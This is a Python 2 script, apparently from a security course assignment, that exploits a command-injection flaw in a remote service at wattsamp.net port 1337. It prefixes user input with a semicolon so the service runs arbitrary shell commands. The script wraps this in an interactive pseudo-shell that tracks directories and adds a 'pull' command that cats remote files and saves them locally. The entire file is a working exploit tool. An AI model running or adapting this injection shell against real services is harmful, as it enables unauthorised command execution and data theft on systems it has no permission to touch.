import socket
import time
import sys

host = "wattsamp.net" # IP address here
port = 1337 # Port here

def execute_cmd(cmd):
        
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    
    data = s.recv(1024)     # Receives 1024 bytes from IP/Port

    time.sleep(1)
   
    s.send("; " + cmd + "\n")

    time.sleep(2)
    
    data = s.recv(1024)
    
    time.sleep(1)
    
    print(data)


def execute_dl(remotepath, localpath):
        
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    
    data = s.recv(1024)     # Receives 1024 bytes from IP/Port

    time.sleep(1)
   
    s.send("; " + "cat " + remotepath + "\n")

    time.sleep(2)
    
    data = s.recv(1024)
    
    time.sleep(1)

    f = open(localpath + "/result.txt", "w+")
    f.write(data)
    f.close()
    
    print(data)


if __name__ == '__main__':
    pm = "shell Drop into an interactive shell and allow users to gracefully exit\npull <remote-path> <local-path> Download files\nhelp Shows this help menu\nquit Quit the shell"
    print(pm)

    sys.stdout.write(">") 

    arg = raw_input()

    while arg != "quit": 

        text = arg.split()
        
        if arg != "shell" and text[0] != "pull" and arg != "quit":
            print(pm)
            sys.stdout.write(">")
            arg = raw_input()

        if arg == "shell":
            prev_i = "/"
            sys.stdout.write(prev_i + ">") 
            prev = prev_i

            while arg != "quit":
                arg = raw_input()
                text = arg.split()

                if text[0] == "cd" and len(text) == 1:
                    prev = prev_i
                    sys.stdout.write(prev + ">") 
                
                elif text[0] == "cd" and len(text) == 2:

                    prev = prev + "/" + text[1]
                    sys.stdout.write(prev + ">") 
                    
                elif text[0] != "quit":
                    execute_cmd("cd " + prev + "; " + text[0])
                    sys.stdout.write(prev + ">") 

            arg = "hey TAs :3"
 
        if text[0] == "pull":
            remotepath = text[1]
            localpath = text[2]

            execute_dl(remotepath, localpath)
          
            arg = "hey TAs :3"
